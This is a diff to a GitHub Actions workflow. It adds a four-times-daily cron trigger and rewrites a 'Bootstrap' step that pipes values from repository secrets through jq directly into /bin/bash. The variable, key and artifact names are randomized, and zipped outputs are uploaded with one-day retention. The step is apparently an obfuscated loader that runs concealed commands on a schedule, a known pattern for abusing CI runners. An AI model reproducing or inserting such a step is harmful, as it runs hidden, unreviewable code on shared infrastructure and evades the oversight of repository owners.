@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '8 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,17 +16,16 @@ jobs:
         uses: actions/checkout@v4
       - name: Bootstrap
         env:
-          uh752: ${{ secrets.uh752 }}
+          jufzd91: ${{ secrets.jufzd91 }}
         run: |
-          printf '%s' "$uh752" | jq -r .hb132 | /bin/bash
-          echo $y9 | jq -r .ralf65 | /bin/bash
-          echo $kcqs78 | jq -r .z7583 | /bin/bash
-          printf '%s' "$iui85" | jq -r .f203 | /bin/bash
-          printf '%s' "$syprl1" | jq -r .x633 | /bin/bash
+          printf '%s' "$jufzd91" | jq -r .rzv9 | /bin/bash
+          echo $b416 | jq -r .nakx766 | /bin/bash
+          echo $cvlvu74244 | jq -r .bahy00 | /bin/bash
+          printf '%s' "$wbo636" | jq -r .bddu95204 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 6EOdIyEG
+          name: EMePYv14
           path: "*.zip"
           retention-days: 1
